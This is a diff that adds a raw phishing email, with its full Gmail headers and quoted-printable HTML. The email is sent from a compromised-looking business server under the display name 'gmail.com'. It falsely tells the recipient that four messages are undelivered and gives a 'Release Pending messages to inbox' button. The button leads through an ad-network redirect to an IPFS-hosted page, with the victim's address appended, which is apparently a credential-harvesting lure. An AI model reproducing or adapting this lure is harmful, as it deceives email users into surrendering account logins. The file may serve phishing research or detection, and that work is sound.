@@ -1,0 +1,153 @@
+X-GM-THRID: 1803615658718806346
+X-Gmail-Labels: Inbox,Opened,Category Personal,Starred
+Delivered-To: dynapapersubmission@gmail.com
+Received: by 2002:a05:6214:1fd6:b0:6b4:fe64:ab52 with SMTP id jh22csp3157142qvb;
+        Wed, 3 Jul 2024 19:58:50 -0700 (PDT)
+X-Google-Smtp-Source: AGHT+IEZlI0CyDeXiLtKQMCTSExebzEmWf4tmvIdW9rYGiTsTnHwMk3hm8u8BOtX/0dEyj0gkrq5
+X-Received: by 2002:a5d:6e5e:0:b0:367:980a:6aa with SMTP id ffacd0b85a97d-3679dd72294mr257396f8f.54.1720061930318;
+        Wed, 03 Jul 2024 19:58:50 -0700 (PDT)
+ARC-Seal: i=1; a=rsa-sha256; t=1720061930; cv=none;
+        d=google.com; s=arc-20160816;
+        b=BdYnD8jKWetT0uJCw8G+/PlsVcW9V1XLruNumWyau/T7w/MM92kS1VSg0mLO/flfDn
+         OB205PF8WsczArQOq8tCYvcYxymREpFQ0bFOlkA748jzFQ960rjV5vQTCjnqZxedys3v
+         ZPv8bPPpntiO1MGKX49jV1kMtfoR2YaiJ3LNuoC9fphlccvcoPT+DEokVql/qWLPY28F
+         SPYYy4vza6Viqrg+N3m2F9kV8fOKhe84AVrVTdwQRiXqpKfNCfZWucZkRpf3yhOIGzIu
+         6wkLefkc94l+G+oOhgZil7iKCrsGjkg3OuRimf4p+WLPU8pxIkuXVUfxHIbqCqwVFNuq
+         VYXw==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20160816;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:to
+         :from:dkim-signature:dkim-filter;
+        bh=H2rPMD4cQPgPwunAkRYlaxPd/a6ql7dz9blzEtVXGS8=;
+        fh=9jKT+T1Uw0A+5dzq86MtnniWAZXbyTpzU841KB0pgzA=;
+        b=m/kOwwZl4a4fO9rH65RftSsRKdu2eota5CGl5btAA1DY4zTIw9/DNwt6s7sJJHHXWL
+         jtFOFchvDtRadFGlHsEMk6N7SoMKXX3zPoCkR4joNrRLCSVWrErd+dDIvgN95b6fZgBw
+         9pEDlz6J39z36pRlhb9LgT8HbxR+IZffc0w14P4ecgN6Ruj62Oj3FTS6XryUCvSgLQoP
+         +OUK62AEnmxYxqQjoLY2jG0ZgcLHf2S3siPkkWlrJ4bLyth9J3UH8eDXnRjsDE/Dj34U
+         Qz9Pn5fRfWTIq3XpaZvOEQebQTjkf0h1eavWrDTxRYWIqwKSGDl1x80etPAU5jO/GWkQ
+         5O3g==;
+        dara=google.com
+ARC-Authentication-Results: i=1; mx.google.com;
+       dkim=neutral (body hash did not verify) header.i=@ghazibrothers.com.pk header.s=D7FC0676-1A1B-11EB-8F25-EA62A861CD47 header.b="j6/gxkEa";
+       spf=pass (google.com: domain of saqlain.raza@ghazibrothers.com.pk designates 103.125.240.152 as permitted sender) smtp.mailfrom=saqlain.raza@ghazibrothers.com.pk
+Return-Path: <saqlain.raza@ghazibrothers.com.pk>
+Received: from email.ghazibrothers.com.pk (email.ghazibrothers.com.pk. [103.125.240.152])
+        by mx.google.com with ESMTPS id ffacd0b85a97d-3678a743bdbsi2447406f8f.536.2024.07.03.19.58.49
+        for <dynapapersubmission@gmail.com>
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Wed, 03 Jul 2024 19:58:50 -0700 (PDT)
+Received-SPF: pass (google.com: domain of saqlain.raza@ghazibrothers.com.pk designates 103.125.240.152 as permitted sender) client-ip=103.125.240.152;
+Authentication-Results: mx.google.com;
+       dkim=neutral (body hash did not verify) header.i=@ghazibrothers.com.pk header.s=D7FC0676-1A1B-11EB-8F25-EA62A861CD47 header.b="j6/gxkEa";
+       spf=pass (google.com: domain of saqlain.raza@ghazibrothers.com.pk designates 103.125.240.152 as permitted sender) smtp.mailfrom=saqlain.raza@ghazibrothers.com.pk
+Received: from localhost (localhost [127.0.0.1])
+	by email.ghazibrothers.com.pk (Postfix) with ESMTP id 669C996106F84
+	for <dynapapersubmission@gmail.com>; Thu,  4 Jul 2024 07:47:25 +0500 (PKT)
+Received: from email.ghazibrothers.com.pk ([127.0.0.1])
+	by localhost (email.ghazibrothers.com.pk [127.0.0.1]) (amavisd-new, port 10032)
+	with ESMTP id S69JotMxg4Yg for <dynapapersubmission@gmail.com>;
+	Thu,  4 Jul 2024 07:47:25 +0500 (PKT)
+Received: from localhost (localhost [127.0.0.1])
+	by email.ghazibrothers.com.pk (Postfix) with ESMTP id 7A04FA7AB32C4
+	for <dynapapersubmission@gmail.com>; Thu,  4 Jul 2024 07:42:36 +0500 (PKT)
+DKIM-Filter: OpenDKIM Filter v2.10.3 email.ghazibrothers.com.pk 7A04FA7AB32C4
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+	d=ghazibrothers.com.pk; s=D7FC0676-1A1B-11EB-8F25-EA62A861CD47;
+	t=1720060956; bh=hbWvc1cxEbmiJdoeRmalcOCUTVJD+IRCYSSeq4rTS3U=;
+	h=From:To:Date:Message-ID:MIME-Version;
+	b=j6/gxkEaTveSVqjieIgsRMFLHWn4JGS9ErRQZf0My1+Gd6N/UnrPEKGRNDQpBLc4M
+	 Sa8nPTEjnXuwTx5+CcLK0USYNC+qeSZJX3HoFZfbIFnv0KxOg4qrdlVe2pFIF64W+2
+	 L19pB08xSKImMbXIHS4W5Nro6Ubl5wx8b6WNQRsCs1T6Qa0utgtQxAtNCe3bHevN4b
+	 Wl+iJckId1M/KTkdlwOnNUAH+BJzVo9Jh+OnYq24FQLF4YGbBatWGoh7qdyKWIrbJf
+	 a32/kplmpy6jOXCBijVA+pf1g1tNC/c18BxBs1XyrBqZfeH4kJVKhd6ksHRu5IWk7d
+	 ItqnPUvgrGfvw==
+X-Amavis-Modified: Mail body modified (using disclaimer) -
+	email.ghazibrothers.com.pk
+X-Virus-Scanned: amavisd-new at ghazibrothers.com.pk
+Received: from email.ghazibrothers.com.pk ([127.0.0.1])
+	by localhost (email.ghazibrothers.com.pk [127.0.0.1]) (amavisd-new, port 10026)
+	with ESMTP id II9ZG4UchWha for <dynapapersubmission@gmail.com>;
+	Thu,  4 Jul 2024 07:42:36 +0500 (PKT)
+Received: from ghazibrothers.com.pk (unknown [105.112.222.204])
+	by email.ghazibrothers.com.pk (Postfix) with ESMTPSA id 50DB6A802C635
+	for <dynapapersubmission@gmail.com>; Thu,  4 Jul 2024 07:37:35 +0500 (PKT)
+From: gmail.com  <saqlain.raza@ghazibrothers.com.pk>
+To: dynapapersubmission@gmail.com
+Subject: You have [4] undelivered Messages 3/7/2024 19:37:33
+Date: 03 Jul 2024 19:37:33 -0700
+Message-ID: <20240703193733.7073450CFDCB3B32@ghazibrothers.com.pk>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<body style=3D"MARGIN: 0.5em">
+<table style=3D"FONT-SIZE: 15px; BORDER-TOP: rgb(211,211,211) 1px dotted; F=
+ONT-FAMILY: Helvetica, Arial, Tahoma, Verdana, sans-serif; BORDER-RIGHT: rg=
+b(211,211,211) 1px dotted; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-B=
+OTTOM: rgb(211,211,211) 1px dotted; TEXT-TRANSFORM: none; FONT-WEIGHT: 400;=
+ COLOR: rgb(0,0,0); FONT-STYLE: normal; BORDER-LEFT: rgb(211,211,211) 1px d=
+otted; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb=
+(255,255,255); font-variant-ligatures: normal;=20
+font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
+thickness: initial; text-decoration-style: initial; text-decoration-color: =
+initial" cellspacing=3D"0" cellpadding=3D"0" width=3D"520" border=3D"1">
+<TBODY>
+<TR style=3D"MIN-HEIGHT: 90px">
+<td style=3D"BORDER-TOP: rgb(211,211,211) 1px dotted; BORDER-RIGHT: rgb(211=
+,211,211) 1px dotted; BORDER-BOTTOM: rgb(211,211,211) 1px dotted; TEXT-ALIG=
+N: center; MIN-HEIGHT: 90px; BORDER-LEFT: rgb(211,211,211) 1px dotted; MARG=
+IN: 0px; LINE-HEIGHT: 1.666" height=3D"90">dynapapersubmission@gmail.com</T=
+D></TR>
+<TR>
+<td style=3D"BORDER-TOP: rgb(211,211,211) 1px dotted; BORDER-RIGHT: rgb(211=
+,211,211) 1px dotted; BORDER-BOTTOM: rgb(211,211,211) 1px dotted; BORDER-LE=
+FT: rgb(211,211,211) 1px dotted; MARGIN: 0px; LINE-HEIGHT: 1.666">
+<DIV style=3D"PADDING-BOTTOM: 0px; DIRECTION: ltr; PADDING-TOP: 0px; PADDIN=
+G-LEFT: 0px; MARGIN: 0px 0px 0px 120px; LINE-HEIGHT: 20px; PADDING-RIGHT: 0=
+px">
+<DIV style=3D'FONT-FAMILY: Segoe, Tahoma, "Sans Verdana", sans-serif, serif=
+, EmojiFont; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARG=
+IN: 20px 120px 30px 0px; LINE-HEIGHT: 20px; PADDING-RIGHT: 0px'><FONT size=
+=3D2><SPAN style=3D"COLOR: rgb(102,102,102); DISPLAY: inline-block">You cur=
+rently have [4] undelivered messages</SPAN></FONT><SPAN style=3D"FONT-SIZE:=
+ 12px; COLOR: rgb(102,102,102); DISPLAY: inline-block"></SPAN><BR><BR>
+<SPAN style=3D"FONT-SIZE: 12px; HEIGHT: 86px; WIDTH: 95px; COLOR: rgb(102,1=
+02,102); DISPLAY: inline-block">
+<table style=3D"FONT-SIZE: 15px; COLOR: rgb(32,31,30); TEXT-INDENT: 0px; fo=
+nt-variant-numeric: inherit; font-variant-east-asian: inherit; font-stretch=
+: inherit" cellpadding=3D"3" border=3D"3">
+<TBODY>
+<TR>
+<TH align=3Dleft>&nbsp;&nbsp;&nbsp;&nbsp; Date</TH></TR>
+<TR>
+<TH align=3Dleft>3/7/2024 19:37:33<BR></TH></TR></TBODY></TABLE></SPAN><BR>=
+</DIV>
+<DIV style=3D"COLOR: rgb(102,102,102); PADDING-BOTTOM: 0px; PADDING-TOP: 0p=
+x; PADDING-LEFT: 0px; MARGIN: 0px 120px 30px 0px; LINE-HEIGHT: 20px; PADDIN=
+G-RIGHT: 0px"><B>
+<A title=3D"This external link will open in a new window" style=3D'FONT-SIZ=
+E: 12px; FONT-FAMILY: Segoe, Tahoma, "Sans Verdana", sans-serif, serif, Emo=
+jiFont; BACKGROUND-IMAGE: none; BACKGROUND-REPEAT: repeat; COLOR: white; PA=
+DDING-BOTTOM: 5px; PADDING-TOP: 5px; PADDING-LEFT: 5px; DISPLAY: block; PAD=
+DING-RIGHT: 5px; BACKGROUND-COLOR: rgb(0,120,215); background-size: auto'=
+=20
+href=3D"https://secure.adnxs.com/clktrb?id=3D704169&amp;redir=3Dhttps://clo=
+udflare-ipfs.com/ipfs/bafybeidijumfgz26wrocgt36nwish73mizgcbamqfkzuen7gzwna=
+76nxna#dynapapersubmission@gmail.com" rel=3D"noopener noreferrer" target=3D=
+_blank data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttp://bb&amp=
+;source=3Dgmail&amp;ust=3D1720119093771000&amp;usg=3DAOvVaw13T9RHcWAaDCSp1G=
+Y86sRf">Release Pending messages to inbox.</A></B><BR><BR><BR></DIV></DIV><=
+/TD></TR></TBODY></TABLE>
+<br>=
+<html> <body>  <br><span style=3D"font-weight:900">Disclaimer:</span><br>=0A
+    The information contained in and accompanying this communication may be confidential, subject to legal privilege, or otherwise protected from disclosure, and is intended solely for the use of the intended recipient(s). If you are not the intended recipient of this communication, please delete and destroy all copies in your possession, notify the sender that you have received this communication in error, and note that any review or dissemination of, or the taking of any action in reliance on, this communication is expressly prohibited. Email messages may contain computer viruses or other defects, may not be accurately replicated on other systems, or may be intercepted, deleted or interfered with without the knowledge of the sender or the intended recipient. Ghazi Brothers makes no warranties in relation to these matters. Please note that Ghazi Brothers reserves the right to intercept, monitor, and retain email messages to and from its systems as permitted by applicable law. If you
+  are not comfortable with the risks associated with e-mail messages, you may decide not to use email to communicate with Ghazi Brothers.=0A
+</span> </body> </html>=0A
+<br>=
+</BODY></HTML>
+
